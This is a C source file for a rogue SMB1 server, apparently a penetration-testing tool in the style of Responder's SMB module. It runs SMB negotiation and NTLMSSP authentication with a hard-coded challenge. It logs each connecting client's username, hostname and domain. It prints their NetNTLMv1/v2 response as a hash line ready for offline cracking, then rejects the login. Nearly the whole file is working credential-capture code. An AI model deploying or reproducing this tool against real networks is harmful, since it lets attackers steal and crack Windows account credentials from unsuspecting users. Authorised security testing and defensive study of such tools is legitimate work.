#include "server.h"
#include "smb1_parser.h"
#include "spnego_decoder.h"
#include "ntlm_parser.h"

#include <stdio.h>

#include <sys/socket.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <poll.h>
#include <errno.h>
#include <arpa/inet.h>

volatile sig_atomic_t keep_running = 1;
size_t port = SERVER_PORT;

const char nt_lm_012[] = "NT LM 0.12";

const unsigned char negotiate_resp_tmpl[] = {
    // NBT Header 
    0x0, 0x0, 0x0, 0x90, 
    
    // SMB Header and Parameters 
    0xff, 0x53, 0x4d, 0x42, 0x72, 0x0, 0x0, 0x0, 0x0, 0x88, 0x1, 0xc8, 
    0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 
    0x0, 0xfe, 0xff, 0x0, 0x0, 0x0, 0x0, 0x11, 0x1, 0x0, 0x3, 0x32, 0x0, 
    0x1, 0x0, 0x4, 0x41, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 
    0x0, 0xfd, 0xf3, 0x1, 0x80, 0x84, 0xd6, 0xfb, 0xa3, 0x1, 0x35, 0xcd, 
    0x1, 0xf0, 0x0, 0x0, 
    
    // SMB ByteCount
    0x4b, 0x0, 
    
    // Server GUID 
    0x3f, 0x62, 0x2a, 0x4e, 0x49, 0xca, 0x66, 0xde, 0xdf, 0x64, 0xd8, 
    0xaa, 0xbc, 0x2a, 0xc, 0x89, 
    
    // SPNEGO ASN.1 Blob (Solo NTLMSSP)
    0x60, 0x39,                         
    0x06, 0x06, 0x2b, 0x06, 0x01, 0x05, 0x05, 0x02,
    0xa0, 0x2f,                         
    0x30, 0x2d,                         
    0xa0, 0x0e,                         
    0x30, 0x0c,  

    // INIZIO OID NTLMSSP
    0x06, 0x0a, 0x2b, 0x06, 0x01, 0x04, 0x01, 0x82, 0x37, 0x02, 0x02, 0x0a, 
    
    // Stringa / Metadata Finale
    0xa3, 0x1b,                         
    0x30, 0x19, 0xa0, 0x17, 0x1b, 0x15, 
    0x36, 0x38, 0x51, 0x4d, 0x36, 0x56, 0x4a, 0x49, 0x38, 0x24, 0x40, 
    0x38, 0x4e, 0x49, 0x49, 0x2e, 0x4c, 0x4f, 0x43, 0x41, 0x4c // "68QJM6VJI8$@8NII.LOCAL"
};

const unsigned char session_setup_challenge_tmpl[] = {
    // NBT Header 
    0x0, 0x0, 0x1, 0xa4,

    // SMB Header \xffSMB
    0xff, 0x53, 0x4d, 0x42,
    // Command: SMB_COM_SESSION_SETUP_ANDX (0x73)
    0x73,
    // NT Status
    0x16, 0x0, 0x0, 0xc0,
    // Flags
    0x88,
    // Flags2
    0x1, 0xc8,
    // PID High
    0x0, 0x0,
    // Security Signature
    0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0,
    // Reserved
    0x0, 0x0,
    // TID
    0x0, 0x0,
    // PID
    0x94, 0x31,
    // UID assegnare UID di sessione
    0xbe, 0x87,
    // MID copiare dal request del client
    0x1, 0x0,

    // Session Setup AndX Response Parameters
    0x4,
    // AndXCommand: 0xFF (nessun comando concatenato)
    0xff,
    // AndXReserved
    0x0,
    // AndXOffset
    0xa4, 0x1,
    // Action
    0x0, 0x0,
    // SecurityBlobLength
    0xf9, 0x0,
    // ByteCount
    0x79, 0x1,

    // SecurityBlo SPNEGO NegTokenResp 
    0xa1, 0x81, 0xf6,
    0x30, 0x81, 0xf3,
    0xa0, 0x3, 0xa, 0x1, 0x1,
    // supportedMech OID NTLMSSP (1.3.6.1.4.1.311.2.2.10)
    0xa1, 0xc, 0x6, 0xa, 0x2b, 0x6, 0x1, 0x4, 0x1, 0x82, 0x37, 0x2, 0x2, 0xa,
    0xa2, 0x81, 0xdd,
    0x4, 0x81, 0xda,

    // NTLMSSP CHALLENGE MESSAGE 
    0x4e, 0x54, 0x4c, 0x4d, 0x53, 0x53, 0x50, 0x0,
    0x2, 0x0, 0x0, 0x0,
    0x8, 0x0, 0x8, 0x0, 0x38, 0x0, 0x0, 0x0,
    0x15, 0x82, 0x89, 0xe2,
    0xc4, 0xba, 0x87, 0xa2, 0x65, 0xde, 0x9e, 0x9,
    0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0,
    0x9a, 0x0, 0x9a, 0x0, 0x40, 0x0, 0x0, 0x0,
    0x5, 0x2, 0xce, 0xe, 0x0, 0x0, 0x0, 0xf,

    // Payload NTLMSSP 
    0x38, 0x0, 0x4e, 0x0, 0x49, 0x0, 0x49, 0x0,
    0x2, 0x0, 0x8, 0x0,
    0x38, 0x0, 0x4e, 0x0, 0x49, 0x0, 0x49, 0x0,
    0x1, 0x0, 0x1e, 0x0,
    0x57, 0x0, 0x49, 0x0, 0x4e, 0x0, 0x2d, 0x0, 0x31, 0x0, 0x46, 0x0,
    0x58, 0x0, 0x34, 0x0, 0x55, 0x0, 0x4d, 0x0, 0x50, 0x0, 0x53, 0x0,
    0x34, 0x0, 0x54, 0x0, 0x42, 0x0,
    0x4, 0x0, 0x34, 0x0,
    0x57, 0x0, 0x49, 0x0, 0x4e, 0x0, 0x2d, 0x0, 0x31, 0x0, 0x46, 0x0,
    0x58, 0x0, 0x34, 0x0, 0x55, 0x0, 0x4d, 0x0, 0x50, 0x0, 0x53, 0x0,
    0x34, 0x0, 0x54, 0x0, 0x42, 0x0, 0x2e, 0x0, 0x38, 0x0, 0x4e, 0x0,
    0x49, 0x0, 0x49, 0x0, 0x2e, 0x0, 0x4c, 0x0, 0x4f, 0x0, 0x43, 0x0,
    0x41, 0x0, 0x4c, 0x0,
    0x3, 0x0, 0x14, 0x0,
    0x38, 0x0, 0x4e, 0x0, 0x49, 0x0, 0x49, 0x0, 0x2e, 0x0, 0x4c, 0x0,
    0x4f, 0x0, 0x43, 0x0, 0x41, 0x0, 0x4c, 0x0,
    0x5, 0x0, 0x14, 0x0,
    0x38, 0x0, 0x4e, 0x0, 0x49, 0x0, 0x49, 0x0, 0x2e, 0x0, 0x4c, 0x0,
    0x4f, 0x0, 0x43, 0x0, 0x41, 0x0, 0x4c, 0x0,
    0x0, 0x0, 0x0, 0x0,

    // NativeOS
    0x57, 0x0, 0x69, 0x0, 0x6e, 0x0, 0x64, 0x0, 0x6f, 0x0, 0x77, 0x0,
    0x73, 0x0, 0x20, 0x0, 0x53, 0x0, 0x65, 0x0, 0x72, 0x0, 0x76, 0x0,
    0x65, 0x0, 0x72, 0x0, 0x20, 0x0, 0x32, 0x0, 0x30, 0x0, 0x30, 0x0,
    0x33, 0x0, 0x20, 0x0, 0x33, 0x0, 0x37, 0x0, 0x39, 0x0, 0x30, 0x0,
    0x20, 0x0, 0x53, 0x0, 0x65, 0x0, 0x72, 0x0, 0x76, 0x0, 0x69, 0x0,
    0x63, 0x0, 0x65, 0x0, 0x20, 0x0, 0x50, 0x0, 0x61, 0x0, 0x63, 0x0,
    0x6b, 0x0, 0x20, 0x0, 0x32, 0x0, 0x0, 0x0,

    // NativeLanMan
    0x57, 0x0, 0x69, 0x0, 0x6e, 0x0, 0x64, 0x0, 0x6f, 0x0, 0x77, 0x0,
    0x73, 0x0, 0x20, 0x0, 0x53, 0x0, 0x65, 0x0, 0x72, 0x0, 0x76, 0x0,
    0x65, 0x0, 0x72, 0x0, 0x20, 0x0, 0x32, 0x0, 0x30, 0x0, 0x30, 0x0,
    0x33, 0x0, 0x20, 0x0, 0x35, 0x0, 0x2e, 0x0, 0x32, 0x0, 0x0, 0x0
};

unsigned char sessions_setup_auth_tmpl[] = {
    // NetBios Header
    0x0, 0x0, 0x0, 0x23, 
    // SMB Sign
    0xff, 0x53, 0x4d, 0x42, 
    // SMB Command
    0x73, 
    // NT Status (STATUS_ACCOUNT_DISABLED)
    0x72, 0x0, 0x0, 0xc0, 
    // Flag
    0x98, 
    // Flag2
    0x1, 0xc8, 
    // PID High
    0x0, 0x0, 
    // Signature
    0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 
    // Reserved
    0x0, 0x0, 
    // TID
    0x0, 0x0, 
    // PID
    0x94, 0x31, 
    //UID
    0xbe, 0x87, 
    //MID
    0x2, 0x0, 
    // Session Setup AndX Resp
    0x0, 0x0, 0x0
};

const uint8_t challenge[] = {0xc4, 0xba, 0x87, 0xa2, 0x65, 0xde, 0x9e, 0x9};

void intHandler(int dummy) {
    keep_running = 0;
}

static void print_ascii_art(){
    printf(ascii_art, VER_MAJOR, VER_MINOR);
}

static void print_server_ver_and_author() {
    printf("[*] Version: %d.%d\n", VER_MAJOR, VER_MINOR);
    printf("[*] Author: Lcky <luca9vinci at gmail dot com>\n\n");
}

static void print_server_info() {
    printf("[*] Server Info\n");
    printf("    Port: %ld\n", port);
    printf("    Max Clients: %d\n", MAX_CLIENTS);
    printf("\n\n");
}

static void setup_listener(int *listen_fd, struct sockaddr_in *addr) {
    *listen_fd = socket(AF_INET, SOCK_STREAM, 0);

    if (*listen_fd < 0) {
        perror("[!] Error setup socket");
        exit(1);
    }

    int yes = 1;

    // Configurazione del socket.
    setsockopt(*listen_fd,      // Socket
               SOL_SOCKET,      // Specifies the configuration level. SO_REUSEADDR is a generic socket option, not specific to TCP or UDP.
               SO_REUSEADDR,    // Enable SO_REUSEADDR on listen_fd
               &yes,            // Pointer to the value to set
               sizeof(yes)
    );
    
    // Bind
    memset(addr, 0, sizeof(*addr));

    addr->sin_family = AF_INET;                // Address family. AF_INET means it's an IPv4 address.
    addr->sin_addr.s_addr = htonl(INADDR_ANY); // INADDR_ANY -> all the IPv4 interfaces.
    addr->sin_port = htons(port);

    if (bind(
            *listen_fd,
            (const struct sockaddr *)addr,
            sizeof(*addr)) < 0) {

        perror("[!] Error in bind socket");
        close(*listen_fd);
        exit(1);
    }

    // Listen
    if (listen(*listen_fd, BACKLOG) < 0) {
        perror("[!] Error in socket listen");
        close(*listen_fd);
        exit(1);
    }

    printf("[*] Listening on port %ld\n", port);
    printf("[*] Waiting for connections...\n\n");
}

static void init_client(client_t *c) {
    c->fd = -1;

    c->status = NEGOTIATE;

    c->netbios_header_recv = 0;
    c->netbios_msg_len = 0;

    c->rx_len = 0;
    c->tx_len = 0;
    c->tx_off = 0;
}

static void init_clients(client_t *clients) {
    for (size_t i = 0; i < MAX_CLIENTS; i++) {
        init_client(&clients[i]);
    }
}

static void client_close(client_t *client) {
    if (client->fd != -1) {
        close(client->fd);
    }

    init_client(client);
}

static void stop_server(client_t *clients) {
    printf("\n[*] Stopping the server...\n");

    // Close all connections
    for (size_t i = 0; i < MAX_CLIENTS; i++) {
        client_close(&clients[i]);
    }
}

static int client_queue_tx(client_t *client, const void *data, size_t len) {
    // Quanto spazio rimane nel buffer
    size_t available = TX_SIZE - client->tx_len;

    if (len > available) {
        printf("[!] Error: TX buffer full: Dropping connection for %s.\n", client->client_ip);
        return -1;
    }

    memcpy(client->tx_buf + client->tx_len, data, len);
    client->tx_len += len;

    return 0;
}

static int client_flush_tx(client_t *client) {
    while (client->tx_off < client->tx_len) {

        ssize_t n = send(client->fd, client->tx_buf + client->tx_off, 
            client->tx_len - client->tx_off, MSG_NOSIGNAL);

        if (n > 0) {
            // Abbiamo inviato n byte.
            client->tx_off += (size_t)n;
            continue;
        }

        if (n < 0 &&
            (errno == EAGAIN || errno == EWOULDBLOCK)) {
            // Il socket non è attualmente pronto per scrivere.
            // Torniamo al poll().
            return 0;
        }

        if (n < 0 && errno == EINTR) {
            continue;
        }

        // Errore definitivo.
        return -1;
    }

    // Tutto il buffer è stato inviato.
    client->tx_len = 0;
    client->tx_off = 0;

    return 0;
}

static int client_read_rx(client_t *client) {
    size_t available = RX_SIZE - client->rx_len;

    if (available == 0) {
        printf("[!] Error: RX buffer full. Dropping connection for %s.\n", client->client_ip);
        return -1;
    }

    ssize_t n = recv(client->fd, client->rx_buf + client->rx_len, available, 0);

    if (n > 0) {
        client->rx_len += (size_t)n;
        return 0;
    }

    if (n == 0) {
        // Il client ha chiuso la connessione.
        return -1;
    }

    if (errno == EINTR) {
        return 0;
    }

    if (errno == EAGAIN ||
        errno == EWOULDBLOCK) {
        // Nessun dato disponibile.
        return 0;
    }

    return -1;
}

static void set_dialect_index(uint8_t *buffer, uint16_t dialect_index) {
    // Il Dialect Index si trova agli offset 37 e 38
    buffer[37] = dialect_index & 0xFF;         // LSB
    buffer[38] = (dialect_index >> 8) & 0xFF;  // MSB
}

// Callback for ASN.1 logging
void asn1_logger(size_t ident, const char *format, va_list args) {
    for (size_t i = 0; i < ident; i++) {
        printf("  |");
    }
    vprintf(format, args);
}

// Callback for NTLM logging
void ntlm_logger(const char *format, va_list args) {
    vprintf(format, args);
}


static int client_process_smb_msg(client_t *client) {
    smb_raw_msg_t raw;
    smb_parsed_msg_t parsed;

    int ret = 1;

    // Parsiamo messaggio
    smb_parser_error_t err = smb_parse_msg(client->rx_buf, client->rx_len, &raw);
    if (err != SMB_PARSER_OK) {
        // malformed packet, wrong signature ecc
        return -1;
    }

    // Parsiamo comando
    err = smb_parse_cmd(raw, &parsed);
    if (err != SMB_PARSER_OK) {
        // unsupported command, etc.
        printf("[!] Comando SMB non supportato o errore parser! ID Comando: 0x%02x\n", raw.header.command);
        ret = -1;
        goto cleanup_1;       
    }

    // In base allo stato del client processiamo il messaggio
    // - ogni stato deve inviare la risposta e aggiornare stato
    switch (client->status) {
        case NEGOTIATE: {
            if (parsed.header.command != SMB_COM_NEGOTIATE 
                || parsed.header.flags & SMB_FLAGS_REPLY) {
                ret = -1;
                goto cleanup_2;
            }
            
            // scelgo, se c'è, SMB1
            int index_dialect = -1;
            for (size_t i = 0; i < parsed.command.negotiate.req.data.len; i++) {
                if (strcmp(
                          (char *)parsed.command.negotiate.req.data.dialects[i].dialect_string,
                          nt_lm_012) == 0) {
                    index_dialect = i;
                    break;
                }
            }

            if (index_dialect < 0) 
                goto cleanup_2;
            
            
            uint8_t new_resp[sizeof(negotiate_resp_tmpl)];
            
            memcpy(new_resp, negotiate_resp_tmpl, sizeof(negotiate_resp_tmpl));

            // modifico template di risposta
            set_dialect_index(new_resp, index_dialect);
            // modifico con TID, PID, UID e MID (8 byte totali) dalla richiesta del client
            memcpy(&new_resp[28], &client->rx_buf[24], 8);

            // Metto nel TX per la risposta
            if (client_queue_tx(client, new_resp, sizeof(negotiate_resp_tmpl)) < 0) {
                goto cleanup_2;
            }          

            client->status = CHALLENGE;
            
            break;
        }

        case CHALLENGE:{
            if (parsed.header.command != SMB_COM_SESSION_SETUP_ANDX
                || parsed.header.flags & SMB_FLAGS_REPLY) {
                ret = -1;
                goto cleanup_2;
            }

            size_t secblob_len = parsed.command.session_setup_andx.req.params.security_blob_len;
            uint8_t *secblob = parsed.command.session_setup_andx.req.data.security_blob;

            set_logger(asn1_logger);
            set_ntlm_logger(ntlm_logger);

            // Parsing ASN1
            asn1_tree_t tree;
            asn1_parser_error_t res = parse(secblob, secblob_len, &tree);

            if (res < PARSER_OK) {
                ret = -1;
                goto cleanup_2;
            }

            // Parsing SPNEGO
            spnego_neg_token_t *spnego_token;
            spnego_dec_error_t spnego_res = spnego_decode(tree, &spnego_token);
            
            if (spnego_res < SPNEGO_OK) {
                //printf("[-] SPNEGO decoding error: 0x%x\n", spnego_res);
                asn1_tree_free(&tree);
                ret = -1;
                goto cleanup_2;
            }
            
            // Ensure it is a NegTokenInit before proceeding
            if (spnego_token->type != NEG_TOKEN_INIT) {
                free(spnego_token);
                asn1_tree_free(&tree);
                ret = -1;
                goto cleanup_2;
            }
            
            uint8_t new_resp[sizeof(session_setup_challenge_tmpl)];
            
            memcpy(new_resp, session_setup_challenge_tmpl, sizeof(session_setup_challenge_tmpl));
            // modifico con TID, PID, UID e MID (8 byte totali) dalla richiesta del client
            memcpy(&new_resp[28], &client->rx_buf[24], 8);

            // Metto nel TX per la risposta
            if (client_queue_tx(client, new_resp, sizeof(session_setup_challenge_tmpl)) < 0) {
                free(spnego_token);
                asn1_tree_free(&tree);
                goto cleanup_2;
            }  

            free(spnego_token);
            asn1_tree_free(&tree);

            client->status = AUTH;
            break;
        }

        case AUTH: {
            if (parsed.header.command != SMB_COM_SESSION_SETUP_ANDX
                || parsed.header.flags & SMB_FLAGS_REPLY) {
                ret = -1;
                goto cleanup_2;
            }

            size_t secblob_len = parsed.command.session_setup_andx.req.params.security_blob_len;
            uint8_t *secblob = parsed.command.session_setup_andx.req.data.security_blob;

            set_logger(asn1_logger);
            set_ntlm_logger(ntlm_logger);

            // Parsing ASN1
            asn1_tree_t tree;
            asn1_parser_error_t res = parse(secblob, secblob_len, &tree);

            if (res < PARSER_OK) {
                ret = -1;
                goto cleanup_2;
            }

            // Parsing SPNEGO
            spnego_neg_token_t *spnego_token;
            spnego_dec_error_t spnego_res = spnego_decode(tree, &spnego_token);
            
            if (spnego_res < SPNEGO_OK) {
                //printf("[-] SPNEGO decoding error: 0x%x\n", spnego_res);
                asn1_tree_free(&tree);
                ret = -1;
                goto cleanup_2;
            }
            
            // Ensure it is a NegTokenResp before proceeding
            if (spnego_token->type != NEG_TOKEN_RESP) {
                asn1_tree_free(&tree);
                ret = -1;
                goto cleanup_2;
            }
            
            
            // Parsing NTLM
            ntlm_msg_t ntlm_msg;
            ntlm_buffer_ctx_t ntlm_ctx;
            
            ntlm_parser_error ntlm_res = ntlm_ctx_buffer_init(
                spnego_token->token.resp_token.response_token,
                spnego_token->token.resp_token.response_token_len, 
                &ntlm_ctx
            );
            
            if (ntlm_res != NTLM_PARSER_OK) {
                free(spnego_token);
                asn1_tree_free(&tree);
                ret = -1;
                goto cleanup_2;
            }
            
            parse_ntlm_msg(&ntlm_ctx, &ntlm_msg);

            printf("[INTERCEPTED] Username: ");
            dump_utf16_le_string(
                ntlm_msg.payload.ntlm_authenticate_msg_payload.username.data,
                ntlm_msg.payload.ntlm_authenticate_msg_payload.username.len, 1
            );

            printf("[INTERCEPTED] Hostname: ");
            dump_utf16_le_string(
                ntlm_msg.payload.ntlm_authenticate_msg_payload.workstation_name.data,
                ntlm_msg.payload.ntlm_authenticate_msg_payload.workstation_name.len, 1
            );

            printf("[INTERCEPTED] Domain  : ");
            dump_utf16_le_string(
                ntlm_msg.payload.ntlm_authenticate_msg_payload.domain_name.data,
                ntlm_msg.payload.ntlm_authenticate_msg_payload.domain_name.len, 1
            );

            if (ntlm_msg.payload.ntlm_authenticate_msg_payload.ntlm_response_type == NTLM_RESPONSE_V2) {
                printf("[INTERCEPTED] Hash(v2): ");
            }
            else {
                printf("[INTERCEPTED] Hash(v1): ");
            }

            dump_utf16_le_string(
                ntlm_msg.payload.ntlm_authenticate_msg_payload.username.data,
                ntlm_msg.payload.ntlm_authenticate_msg_payload.username.len, 0
            );
            printf("::");

            dump_utf16_le_string(
                ntlm_msg.payload.ntlm_authenticate_msg_payload.domain_name.data,
                ntlm_msg.payload.ntlm_authenticate_msg_payload.domain_name.len, 0
            );

            printf(":");

            for (size_t i = 0; i < sizeof(challenge); i++) {
                printf("%02x", challenge[i]);
            }
            printf(":");

            if (ntlm_msg.payload.ntlm_authenticate_msg_payload.ntlm_response_type == NTLM_RESPONSE_V2) {
            
                ntlm_v2_response_t resp;
                ntlm_parser_error err;
                err = ntlm_v2_response_payload_parse(
                    &ntlm_msg.payload.ntlm_authenticate_msg_payload.nt_challenge_response,
                    &resp
                );

                if (err != NTLM_PARSER_OK) {
                    free_ntlm_msg(&ntlm_msg);
                    free(spnego_token);
                    asn1_tree_free(&tree);
                    ret = -1;
                    goto cleanup_2; 
                }

                for (size_t i = 0; i < sizeof(resp.response); i++) {
                    printf("%02x", resp.response[i]);
                }
                printf(":");


                size_t len = ntlm_msg.payload.ntlm_authenticate_msg_payload.nt_challenge_response.len - sizeof(resp.response);
                for (size_t i = 0; i < len; i++) {
                    printf("%02X", ntlm_msg.payload.ntlm_authenticate_msg_payload.nt_challenge_response.data[16 + i]);
                }

                printf("\n");
            }

            else {
                for (size_t i = 0; i < LM_RESPONSE_SIZE; i++) {
                    printf("%02x", ntlm_msg.payload.ntlm_authenticate_msg_payload.nt_challenge_response.data[i]);
                }
                printf("\n");
            }

            uint8_t new_resp[sizeof(sessions_setup_auth_tmpl)];
            memcpy(new_resp, sessions_setup_auth_tmpl, sizeof(sessions_setup_auth_tmpl));
            // Metto nel TX per la risposta
            if (client_queue_tx(client, new_resp, sizeof(sessions_setup_auth_tmpl)) < 0) {
                free_ntlm_msg(&ntlm_msg);
                free(spnego_token);
                asn1_tree_free(&tree);
                goto cleanup_2;
            }  

            // Clean up
            free_ntlm_msg(&ntlm_msg);
            free(spnego_token);
            asn1_tree_free(&tree);

            client->status = NEGOTIATE;
            break;
        }
        
        default: {
            ret = -1;
            goto cleanup_2;
        }
    }
    
cleanup_2:
    free_smb_cmd_msg(&parsed);
cleanup_1:
    free_smb_raw_msg(&raw);
    return ret;
}

static int client_process_rx(client_t *client) {
    // Vediamo se netbios è settato
    // Se è settato, allora vediamo se è arrivato tutto il messaggio
    // - se è arrivato processiamolo, dopo resettiamo flag del netbios per il rpssimo messaggio
    // - altrimenti continue
    if (client->netbios_header_recv) {
        
        if (client->rx_len >= client->netbios_msg_len) {

            // Parsiamo messaggio
            if (client_process_smb_msg(client) < 0) {
                printf("[!] The server has closed the connection with: %s\n", client->client_ip);
                return -1;
            }

            // Facciamo uno shift dei dati rimanenti in modo che partano dalla base del buffer
            size_t remaining = client->rx_len - client->netbios_msg_len;
            if (remaining > 0) {
                memmove(client->rx_buf, client->rx_buf + client->netbios_msg_len, remaining);
            }
            client->rx_len = remaining;

            // Resettiamo flag netbios
            client->netbios_header_recv = 0;
            client->netbios_msg_len = 0;

            return 1;
            
        }
        else {
            // Non abbiamo ancora tutto il messaggio
            return 0;
        }

    }

    // Se non è settato vediamo se abbiamo alemeno 4 byte nel buffer
    // - se non ha 4 byte allora continue
    // - se li ha allora leggiamoli e settiamo il flag e la lunghezza e contininiuamo
    else {

        if (client->rx_len >= NETBIOS_HEADER) {
            client->netbios_header_recv = 1;
            client->netbios_msg_len = (size_t)(((uint32_t)(client->rx_buf[1])) << 16
                                    | ((uint32_t)(client->rx_buf[2])) << 8
                                    | (uint32_t)(client->rx_buf[3]));
            
            size_t remaining = client->rx_len - NETBIOS_HEADER;
            memmove(client->rx_buf, client->rx_buf + NETBIOS_HEADER, remaining);
            client->rx_len = remaining;

            return 0;
        }
        else {
            // Non abbiamo ancora i 4 byte
            return 0;
        }
    }
}


static void start_server(int listen_fd, client_t *clients, struct pollfd *pfds) {

    while(keep_running) {

        // Il primo è il listener
        pfds[0].fd = listen_fd;
        pfds[0].events = POLLIN;
        pfds[0].revents = 0;

        for (size_t i = 0; i < MAX_CLIENTS; i++) {
            pfds[i + 1].fd = clients[i].fd;
            pfds[i + 1].events = 0;
            pfds[i + 1].revents = 0;

            if (clients[i].fd == -1) continue;

            pfds[i + 1].events |= POLLIN;

            // Se c'è roba da inviare (quindi TX non vuoto) ci interessa scrivere.
            if (clients[i].tx_off < clients[i].tx_len) {
                pfds[i + 1].events |= POLLOUT;
            }
        }

        int ret = poll(pfds, MAX_CLIENTS + 1, -1);
        
        if (ret < 0) {
            if (errno == EINTR) continue;
            perror("[!] Error in poll()");
            break;
        }

        /**
         * Nuove connessioni
         */
        if (pfds[0].revents & POLLIN) {

            // Memorizzo info sul client
            struct sockaddr_in clientaddr;
            socklen_t clientaddr_size = sizeof(clientaddr);

            int client_fd = accept(listen_fd, (struct sockaddr *)&clientaddr, &clientaddr_size);

            if (client_fd < 0) {
                perror("[!] Error in accept()");
            }
            else {
                int inserted = 0;
                for (int i = 0; i < MAX_CLIENTS; i++) {
                    if (clients[i].fd == -1) {
                        clients[i].fd = client_fd;

                        // Converte l'IP da binario a stringa
                        char client_ip[INET_ADDRSTRLEN];
                        inet_ntop(AF_INET, &(clientaddr.sin_addr), client_ip, INET_ADDRSTRLEN);

                        // Salva IP
                        strncpy(clients[i].client_ip, client_ip, INET_ADDRSTRLEN);
                        
                        //printf("[+] New client connected: %s\n", clients[i].client_ip);
                        inserted = 1;
                        break;
                    }
                }

                if (!inserted) {
                    printf("[!] New connection refused. Too many clients.\n");
                    close(client_fd);
                }
            }
        }

        /**
         * Gestione client
         */
        for (size_t i = 0; i < MAX_CLIENTS; i++) {
            client_t *client = &clients[i];

            if (client->fd == -1) {
                continue;
            }

            short events = pfds[i + 1].revents;
            
            if (events & (POLLERR |
                          POLLHUP |
                          POLLNVAL)) {

                //printf("[-] Client disconnected: %s\n", client->client_ip);
                client_close(client);
                continue;
            }

            /**
             * Gestione ricezione
             */
            if (events & POLLIN) {
                if (client_read_rx(client) < 0) {
                    client_close(client);
                    continue;
                }

                // Processiamo quello che abbiamo ricevuto
                while (client->rx_len > 0) {
                    size_t before = client->rx_len;

                    if (client_process_rx(client) < 0) {
                        client_close(client);
                        break;
                    }
                    
                    // Non c'è un messaggio completo
                    if (client->rx_len == before) {
                        break;
                    }
                }
            }

            /**
             * Gestione invio
             */
            if (client->fd != -1 && (events & POLLOUT)) {
                if (client_flush_tx(client) < 0) {
                    printf("[!] TX error. The server has closed the connection with: %s\n", client->client_ip);
                    client_close(client);
                    continue;
                }
            }

        }
    }
}


int main(int argc, char *argv[]) {
    print_ascii_art();
    print_server_ver_and_author();

    if (argc > 1) {
        port = (size_t)atoi(argv[1]);
        if (port <= 0 || port > 65535) {
            printf("\n[!] Invalid port number\n");
            exit(1);
        }
    }

    print_server_info();

    signal(SIGINT, intHandler);

    int listen_fd;
    struct sockaddr_in addr;

    /**
     * SET UP LISTENER
     */
    setup_listener(&listen_fd, &addr);

    /**
     * SETUP CLIENTS
     */
    client_t clients[MAX_CLIENTS];
    init_clients(clients);

    /**
     * START MAIN LOOP
     */
    struct pollfd pfds[MAX_CLIENTS + 1];
    start_server(listen_fd, clients, pfds);

    /**
     * STOPPING THE SERVER
     */
    stop_server(clients);
    
    return 0;
}